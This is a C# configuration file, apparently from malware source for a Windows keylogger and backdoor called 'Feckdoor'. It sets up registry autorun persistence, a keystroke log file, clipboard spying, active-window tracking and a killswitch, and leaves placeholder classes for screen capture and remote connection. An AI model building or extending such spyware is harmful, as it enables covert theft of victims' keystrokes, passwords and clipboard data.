namespace Feckdoor
{
	public class Config
	{
		// Global entry
		public static Config TheConfig
		{
			get; set;
		} = null!;

		public string ProgramLogFile
		{
			get; set;
		} = @".\Feckdoor.log";

		public string LogTemplate
		{
			get; set;
		} = "{Timestamp:yyyy-MM-dd HH:mm:ss.fff zzz} [{Level:u3}] {Message:lj}{NewLine}{Exception}";

		public string RegistryAutorunName
		{
			get; set;
		} = "Feckdoor";

		public string Killswitch
		{
			get; set;
		} = "70 71 72 73 78 79 7A 7B";

		public InputLogSection InputLog
		{
			get; set;
		} = new InputLogSection();
	}

	public class InputLogSection
	{
		public LogMode LogMode
		{
			get; set;
		} = LogMode.PlainText;

		public string InputLogFile
		{
			get; set;
		} = @".\Input.log";

		public bool ShiftPrefix
		{
			get; set;
		}

		public bool SuppressModifierKey
		{
			get; set;
		}

		public bool AutoCapitalize
		{
			get; set;
		} = true;

		public int ClipboardSpyDelay
		{
			get; set;
		} = 200;

		public string FallbackWindowName
		{
			get; set;
		} = "Unknown window";

		public string FallbackWindowExecutableName
		{
			get; set;
		} = "Unknown executable";

		public int SaveWait
		{
			get; set;
		} = 2000;
		
		public int SaveMaxUndone
		{
			get; set;
		} = 20;
		
		public int SaveDelay
		{
			get; set;
		} = 100;

		public PlainTextSection PlainText
		{
			get; set;
		} = new PlainTextSection();
	}

	public class PlainTextSection
	{
		public string TimestampFormat
		{
			get; set;
		} = "dd MMM yyyy hh:mm:ss.ffff tt";

		public int TimestampDelay
		{
			get; set;
		} = 5000;
	}

	// TODOs

	public class ScreenCapture
	{

	}

	public class RemoteConnect
	{

	}


	public enum LogMode
	{
		PlainText,
		SQLite
	}
}
